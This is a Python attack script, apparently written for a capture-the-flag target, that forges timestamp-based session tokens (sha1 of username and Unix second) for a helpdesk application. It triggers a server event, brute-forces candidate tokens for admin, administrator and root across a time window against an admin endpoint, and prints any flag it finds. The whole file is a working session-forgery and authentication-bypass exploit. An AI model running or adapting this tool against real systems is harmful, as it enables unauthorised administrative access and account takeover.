#!/usr/bin/env python3
"""
session_time_bruteforce.py — Brute-force predictable timestamp-based session tokens.
Originally developed for DeskHero Helpdesk (Port 8068).

Reverses tokens generated using formulas like sha1("<user>:<unix_second>"),
brackets timestamp windows during server-side events, and enumerates tokens
to access administrative queues.
"""

import argparse
import hashlib
import re
import sys
import time
import requests

DEFAULT_BASE = "http://10.110.3.72:8068"
FLAG_RE = re.compile(r"flag\{[a-zA-Z0-9_-]+\}")


def sha1_token(account: str, timestamp: int) -> str:
    return hashlib.sha1(f"{account}:{timestamp}".encode()).hexdigest()


def probe_admin(base_url: str, admin_path: str, token: str, cookie_name: str = "token", timeout: int = 5):
    """Tests a single token candidate against the admin endpoint."""
    url = f"{base_url}{admin_path}"
    try:
        r = requests.get(url, cookies={cookie_name: token}, timeout=timeout, allow_redirects=True)
        return r.status_code, r.text
    except Exception as e:
        return None, str(e)


def trigger_event(base_url: str, trigger_path: str, timeout: int = 5):
    """Triggers the server-side event and brackets the exact UNIX timestamp."""
    url = f"{base_url}{trigger_path}"
    t0 = int(time.time())
    try:
        r = requests.post(url, timeout=timeout)
        t1 = int(time.time())
        return r.status_code, t0, t1
    except Exception as e:
        t1 = int(time.time())
        return None, t0, t1


def main():
    parser = argparse.ArgumentParser(
        description="Predictable timestamp session token brute-forcer."
    )
    parser.add_argument(
        "--base", default=DEFAULT_BASE, help="Base target URL (default: http://10.110.3.72:8068)"
    )
    parser.add_argument(
        "--trigger", default="/bot/refresh-oncall", help="Endpoint to trigger admin action/login"
    )
    parser.add_argument(
        "--admin-path", default="/ticket/admin", help="Protected admin path to probe"
    )
    parser.add_argument(
        "--account", default="admin", help="Target username to forge tokens for (default: admin)"
    )
    parser.add_argument(
        "--cookie-name", default="token", help="Session cookie name (default: token)"
    )
    parser.add_argument(
        "--margin", type=int, default=5, help="Seconds before/after to search for clock skew (default: 5)"
    )
    parser.add_argument(
        "--manual-ts", type=int, help="Optional manual timestamp to center brute-force around without triggering"
    )
    args = parser.parse_args()

    if args.manual_ts:
        t0, t1 = args.manual_ts - args.margin, args.manual_ts + args.margin
        print(f"[*] Manual timestamp range: [{t0}, {t1}]")
    else:
        print(f"[*] Triggering event on {args.base}{args.trigger} ...")
        status, t0, t1 = trigger_event(args.base, args.trigger)
        print(f"    Trigger response status: {status} (window: [{t0}, {t1}])")

    print(f"[*] Enumerating candidate tokens for user '{args.account}' across window [{t0 - args.margin}, {t1 + args.margin}] ...")
    
    accounts = [args.account, "administrator", "root"]

    for t in range(t0 - args.margin, t1 + args.margin + 1):
        for acct in accounts:
            tok = sha1_token(acct, t)
            code, body = probe_admin(args.base, args.admin_path, tok, cookie_name=args.cookie_name)
            if code == 200:
                print(f"\n[+] SUCCESS! Valid token found:")
                print(f"    Account   : {acct}")
                print(f"    Timestamp : {t}")
                print(f"    Formula   : sha1('{acct}:{t}')")
                print(f"    Token     : {tok}")

                flags = FLAG_RE.findall(body)
                if flags:
                    print(f"\n[+] FLAG DISCOVERED: {flags[0]}")
                else:
                    print(f"\n[*] Response body preview:\n{body[:400]}")
                return

    print("[-] No valid admin token found within the window. Try widening --margin.")


if __name__ == "__main__":
    main()
